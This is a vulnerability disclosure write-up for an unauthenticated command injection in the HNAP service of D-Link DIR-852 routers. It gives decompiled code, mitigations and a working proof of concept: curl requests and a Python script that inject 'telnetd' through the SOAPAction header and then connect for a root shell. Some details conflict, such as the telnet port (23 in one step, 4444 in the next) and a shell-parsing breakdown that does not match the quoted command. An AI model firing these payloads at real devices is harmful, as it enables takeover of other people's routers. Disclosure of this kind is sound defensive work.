## Command Injection in D-Link DIR-852 Service 

Vendor:  D-Link

Product:  DIR852

Download Link:   [D-Link Technical Support](http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-852)

Version:  1.00

Type:  Command injection

Author:  XU17

#### 1. **Vulnerability Overview**
A critical **command injection vulnerability** exists in the HNAP (Home Network Administration Protocol) service of D-Link DIR-852 routers (Firmware Version 1.00). The flaw resides in the `hnap_main` function, which processes HNAP requests. An unauthenticated attacker can exploit this by sending a specially crafted HTTP request with a malicious `SOAPAction` header, leading to **arbitrary command execution with root privileges**.

#### 2. **Technical Root Cause**

The vulnerability stems from **unsanitized user input** from the `SOAPAction` HTTP header being directly concatenated into a shell command executed via `system()`. Below is a step-by-step breakdown of the vulnerable code path:

##### Step 1: Retrieve User-Controlled Input
The CGI environment variable `HTTP_SOAPACTION` (derived from the `SOAPAction` HTTP header) is read into `v5`:
```c
v5 = getenv("HTTP_SOAPACTION"); // User-controlled input
```

##### Step 2: Bypass Authentication for Specific Actions
The service skips authentication if `SOAPAction` contains `GetDeviceSettings` or `GetWLanRadios`:
```c
if (!strstr(v5, "http://purenetworks.com/HNAP1/GetDeviceSettings") &&
    !strstr(v5, "http://purenetworks.com/HNAP1/GetWLanRadios") &&
    sub_411240(v4) < 0) {
    // Authentication failure (401)
}
```
This allows unauthenticated exploitation when the payload includes these keywords.

##### Step 3: Extract Action Name (`v9`)
The code extracts the substring after the last `/` in `v5` into `v9`:
```c
v8 = strrchr(v5, '/'); // Find last '/'
v9 = v8 + 1;           // e.g., "GetDeviceSettings" from ".../GetDeviceSettings"
```
**Critical Issue**: `v9` is directly controlled by the attacker via `SOAPAction`.

##### Step 4: Command Injection via `system()`
The extracted `v9` is unsafely formatted into a shell command and executed:
```c
sprintf(v26, "sh %s%s.sh > /dev/console &", "/var/run/", v9);
system(v26); // Command injection occurs here
```
Since `v9` is attacker-controlled, shell metacharacters (e.g., `;`, `|`, `\n`) can break out of the intended command context.

---

#### 3. **Exploitation Workflow**

##### Step 1: Craft Malicious `SOAPAction`
The attacker embeds a command (e.g., `telnetd`) after a valid HNAP action to bypass auth:
```http
SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings";telnetd;
```
- `GetDeviceSettings` satisfies the auth bypass condition.
- `;telnetd;` injects the command to start the Telnet daemon.

##### Step 2: Send Exploit Request
```bash
curl -i -X POST http://192.168.0.1/HNAP1/ \
  -H 'SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings;telnetd' \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/"></GetDeviceSettings></soap:Body></soap:Envelope>'
```
- The server returns `HTTP/500` (due to command execution errors), but the injected command **still executes**.

##### Step 3: Execute Injected Command
The final command executed on the device is:
```bash
sh /var/run/GetDeviceSettings";telnetd;.sh > /dev/console &
```
Shell parsing:
1. `sh /var/run/GetDeviceSettings".sh` → Fails (file doesn’t exist).
2. `telnetd` → **Executes successfully** (starts Telnet on port 23).
3. `.sh` → Fails (ignored).

##### Step 4: Gain Root Shell
Connect via Telnet (no password required on vulnerable firmware):
```bash
telnet 192.168.0.1 4444
# Output: 
# Connected to 192.168.0.1.
# # ← Root shell obtained
```

---

#### 4. **Why HTTP/500 Indicates Success**
- The `500 Internal Server Error` occurs because:
  - The CGI process crashes when `system()` fails to execute the non-existent `.sh` script.
  - XML parsing or other internal operations fail after command injection.
- **This is typical for blind command injection**: The HTTP response is irrelevant; the critical factor is whether the injected command runs (which it does).

---

#### 5. **Affected Firmware & Devices**
- **Confirmed Vulnerable**: D-Link DIR-852 (Firmware v1.00)
- **Other Likely Affected Models**: DIR-816, DIR-850L, and other D-Link devices using the same HNAP implementation.

---

#### 6. **Mitigation**
1. **Immediate**: 
   - Disable HNAP/UPnP services if unused.
   - Update firmware to patched versions (if available).
2. **Long-Term**:
   - Input validation: Restrict `v9` to a whitelist of allowed HNAP actions.
   - Avoid `system()`: Use safer alternatives (e.g., `execve` with hardcoded paths).
   - Drop privileges: Run HNAP service as a non-root user.

---

#### 7. **Proof of Concept (PoC)**
```python
import requests

target = "http://192.168.0.1"
payload = 'http://purenetworks.com/HNAP1/GetDeviceSettings;telnetd -p 4444'

headers = {
    "SOAPAction": payload,
    "Content-Type": "text/xml"
}

body = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/"/>
  </soap:Body>
</soap:Envelope>"""

# Trigger command injection
requests.post(f"{target}/HNAP1/", headers=headers, data=body)

# Connect to Telnet on port 4444
import telnetlib
tn = telnetlib.Telnet("192.168.0.1", 4444)
tn.interact()  # Root shell
```



```
curl -i -X POST http://192.168.0.1/HNAP1/ \
  -H 'SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings;telnetd -p 4444' \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/"></GetDeviceSettings></soap:Body></soap:Envelope>'
```

![Pasted image 20250926103548](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202511100854484.png)


---

#### 8. **Conclusion**
This vulnerability exemplifies a classic **command injection flaw** caused by concatenating unsanitized user input into shell commands. The authentication bypass for specific HNAP actions (`GetDeviceSettings`, `GetWLanRadios`) enables **unauthenticated remote code execution**, making it critical for embedded devices. Users must apply patches immediately or isolate affected devices from untrusted networks.